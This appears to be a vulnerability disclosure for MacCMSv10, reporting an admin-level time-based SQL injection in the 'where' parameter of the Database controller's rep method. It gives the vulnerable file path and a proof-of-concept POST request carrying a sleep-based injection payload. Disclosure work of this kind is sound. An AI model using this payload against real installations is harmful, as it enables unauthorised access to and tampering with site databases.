# Vendor

magicblack

# Product

MacCMSv10

# version

v2025.1000.4050

# Download 

https://github.com/magicblack/maccms10

https://www.maccms.cn/down.html

# Vulnerability

SQL Inject

# Description

The where parameter in the rep method(in application/admin/controller/Database.php) is not properly sanitized, allowing an administrator to execute arbitrary SQL queries.

# Analysis

Vulnerability file: 
application/admin/controller/Database.php

Vulnerability method: req()

The where parameter in the rep method(in application/admin/controller/Database.php) is not properly sanitized, allowing an administrator to execute arbitrary SQL queries.

1. application/admin/controller/Database.php - req method:

<img width="1072" height="500" alt="image" src="https://github.com/user-attachments/assets/86b713fb-b6b4-4cd0-88c5-4ce55016a9d3" />

The where parameter in the rep method is not properly sanitized, allowing an administrator to execute arbitrary SQL queries.

Recurrence of vulnerabilities:
During deployment, I said that admin.php is changed to admin1.php

I tried to sleep(2) seconds and see if the page delay time is 2*2=4 seconds:
<img width="1418" height="920" alt="image" src="https://github.com/user-attachments/assets/89f08eca-08ba-48ec-aa5a-03575b60cdd2" />

I tried to sleep(5) seconds and see if the page delay time is 2*5=10 seconds:
<img width="1422" height="925" alt="image" src="https://github.com/user-attachments/assets/6fbd4bf2-c7da-4cc3-b575-0fc04d12a4db" />


# POC
```
During deployment, I said that admin.php is changed to admin1.php,__token__ can replace it by intercepted tokens in the request
POST /admin1.php/admin/database/rep HTTP/1.1
Host: [TARGET]
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=XXX

table=mac_admin&field=admin_name&findstr=a&tostr=b&where=and+if(1=1,sleep(5),0)&__token__=[PASTE_THE_TOKEN_HERE]

```





<img width="1414" height="920" alt="image" src="https://github.com/user-attachments/assets/c1d911a2-43a6-4047-8c8c-e25654c44303" />
